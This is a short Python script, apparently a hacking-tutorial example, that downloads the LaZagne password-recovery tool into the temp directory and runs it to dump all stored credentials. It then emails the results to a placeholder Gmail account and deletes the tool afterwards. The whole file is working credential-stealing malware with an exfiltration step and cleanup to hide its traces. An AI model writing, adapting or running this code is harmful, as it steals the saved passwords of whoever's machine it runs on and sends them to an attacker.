#!/usr/bin/env python

import requests, subprocess, smtplib, re, os, tempfile

# Function to fetch a file from a given URL
def fetch_file(url):
    # Send a GET request to the URL
    get_response = requests.get(url)
    # Extract the file name from the URL
    file_name = url.split("/")[-1]
    # Write the response content to a file
    with open(file_name, "wb") as output_file:
        output_file.write(get_response.content)

# Function to send an email
def send_email(email_addr, passwd, msg):
    # Establish a connection with the SMTP server
    server = smtplib.SMTP("smtp.gmail.com", 587)
    # Start TLS encryption
    server.starttls()
    # Login to the email server
    server.login(email_addr, passwd)
    # Send the email
    server.sendmail(email_addr, email_addr, msg)
    # Quit the SMTP server
    server.quit()

# Get the system's temporary directory
temp_dir = tempfile.gettempdir()
# Change the current working directory to the temporary directory
os.chdir(temp_dir)
# Download the file from the specified URL
fetch_file("URL......laZagne.exe")
# Execute the downloaded file and capture the output
result = subprocess.check_output("laZagne.exe all", shell=True)
# Send the captured output via email
send_email(".....@gmail.com", "1234567", result)
# Remove the downloaded file from the system
os.remove("laZagne.exe")

